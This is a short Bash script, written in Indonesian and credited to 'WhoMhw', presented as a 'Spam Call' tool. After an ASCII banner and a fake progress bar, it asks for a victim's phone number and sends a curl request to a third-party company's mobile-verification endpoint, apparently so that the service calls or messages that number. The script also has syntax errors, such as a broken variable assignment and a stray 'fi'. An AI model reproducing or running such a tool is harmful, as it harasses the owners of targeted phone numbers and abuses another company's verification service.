#!/bin/bash



banner(){
    
    echo "   ..  ...  ...  ...  ..      .          ..  ....."
    sleep 0.03
    echo "  ...  .... .... ....     %/\      .. ..  .....  ."
    sleep 0.03
    echo " .  ...  ...  ... ..     %/  &.     ..  ......  .."
    sleep 0.03
    echo " ..  ....  ..  ...     .%/     \        ...  ....."
    sleep 0.03
    echo " ....  ....  ..      .%*/       &.     ...  ..... "
    sleep 0.03
    echo " ......  .... .    .%.*/  .d99b_  \      . ....  ."
    sleep 0.03
    echo "   .......       .%***/ -'       '.&.     ...  ..."
    sleep 0.03
    echo " ..     ..     .%****/  ._.   '~::,  \      . . .."
    sleep 0.03
    echo " .......     .%*****/._'  .' ^':,  :.,&.     . .. "
    sleep 0.03
    echo " ...       .%******/',_-^{  ( )  }    :.\       .."
    sleep 0.03
    echo "   ..     .%******/%^    '.     .'    ;.&.       "
    sleep 0.03
    echo " .     .%********/;        ".,."        ;#. \     "
    sleep 0.03
    echo "      .%********/  ~'.,,.          ,.-'^  &.      "
    sleep 0.03
    echo "    .%*********/         ""-.,.-""~          \    "
    sleep 0.03
    echo "  .%**********/                              &.  "
    sleep 0.03
    echo " %***********/                                 \ "
    sleep 0.03
    echo " ************************************************"
    sleep 0.03
    echo "                  Call                       "
    sleep 0.03
    echo " ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
    echo "Load......!!"
    sleep 3
    echo "press enter untuk lanjut......!!!!"
    read
    echo "+===============================+"
    sleep 0.03
    echo "|    Author: WhoMhw             |"
    sleep 0.05
    echo "+===============================+"
    sleep 0.03
    echo "++++++++++++++++++++++++++++++"
    echo "|        Keterangan          |"
    echo "|____________________________|"
    sleep 0.03
    echo "| memasukkan nomor tanpa0/+62|"
    sleep 0.03
    echo "+____________________________+"
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.5
    done
}
banner



printf "1.Spam Call"
printf '\n'
printf "2.exit"
printf '\n'
read -p "root@terminal:~#" pill
if [[ $pill = "1" ]]; then
printf "\n"
read -p "Nomor:" nomor
printf '\n'
printf "mencoba"
load
printf '\n'
link ="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
printf '\n'
fi
#batas
if [[ $pill = "2" ]]; then
echo "kamu Keluar..................!!!!!"
sleep 2
echo "Tekan enter Untuk keluar!"
read 
load
printf '\n'
exit
fi


echo "=========================================="
echo "Author : WhoMHw                        "
echo "terima kasih telah menggunakan tools ini"
echo "=========================================="
exit
fi
echo
